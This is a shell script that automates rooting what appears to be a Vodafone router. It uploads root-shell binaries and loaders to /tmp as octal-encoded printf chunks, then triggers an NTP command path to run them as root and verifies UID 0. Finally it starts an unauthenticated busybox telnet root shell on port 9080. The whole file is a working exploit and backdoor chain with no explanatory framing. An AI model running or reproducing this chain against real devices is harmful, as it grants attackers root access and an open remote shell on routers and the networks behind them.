#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
port="${2:-9536}"
here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$here"

upload() {
    src=$1
    dst=$2
    octal=$(od -An -v -to1 "$src" | tr -s ' ' '\n' |
        sed '/^$/d;s/^/\\/' | tr -d '\n')
    {
        sleep 2
        printf ': >%s\n' "$dst"
        printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do
            printf "printf '%s' >>%s\n" "$chunk" "$dst"
        done
        sleep 1
    } | timeout 15 ./vodafone-direct-shell.sh "$host" "$port" >/dev/null 2>&1 || true
}

echo '[1/4] Uploading reboot-volatile root-shell files...'
upload root_tcp_shell.bin /tmp/root_tcp_shell.bin
upload root-shell-bootstrap.bin /tmp/root_shell_bootstrap.bin
upload root-loader.sh /tmp/root-loader.sh
upload root-file-shell.sh /tmp/root-file-shell.sh

echo '[2/4] Creating UID-1007-readable command channels...'
{
    sleep 2
    printf ': >/tmp/root-shell.in; : >/tmp/root-shell.out\n'
    sleep 2
} | timeout 10 ./vodafone-direct-shell.sh "$host" "$port" >/dev/null 2>&1 || true

echo '[3/4] Triggering the sc_net root NTP command path...'
timeout 40 ./vodafone-scnet-ntp-proof.sh "$host" "$port" \
    >vodafone-root-shell-setup.last.log 2>&1 || true

echo '[4/4] Verifying the persistent worker...'
sleep 2
result=$(
    {
        printf '/bin/cat /proc/self/status\n'
        printf 'exit\n'
    } | ./vodafone-root-shell.sh "$host" "$port" 2>/dev/null
)
printf '%s\n' "$result" | sed -n '/^Uid:/p;/^Gid:/p;/^Groups:/p;/^CapEff:/p'
if ! printf '%s\n' "$result" | grep -q '^Uid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0'; then
    echo 'Root worker verification failed; inspect vodafone-root-shell-setup.last.log.' >&2
    exit 1
fi

echo 'Root command shell ready: ./vodafone-root-shell.sh' 

echo 'Enabling the optional interactive telnet shell...'
telnet_result=$(
    {
        printf 'if test -f /mnt/usb0/busybox-armv7l; then /bin/mount -o remount,rw,exec /tmp; /bin/cp /mnt/usb0/busybox-armv7l /tmp/busybox; /tmp/busybox ln -sf /tmp/busybox /tmp/sh; /tmp/busybox killall telnetd 2>/dev/null; /tmp/busybox telnetd -p 9080 -l /tmp/sh; /tmp/busybox netstat -lntp 2>/dev/null | /tmp/busybox grep 9080; else echo USB_BUSYBOX_NOT_FOUND; fi\n'
        printf 'exit\n'
    } | ./vodafone-root-shell.sh "$host" "$port" 2>/dev/null
)
printf '%s\n' "$telnet_result"
if printf '%s\n' "$telnet_result" | grep -q '0.0.0.0:9080'; then
    echo "Root telnet ready: telnet $host 9080"
fi
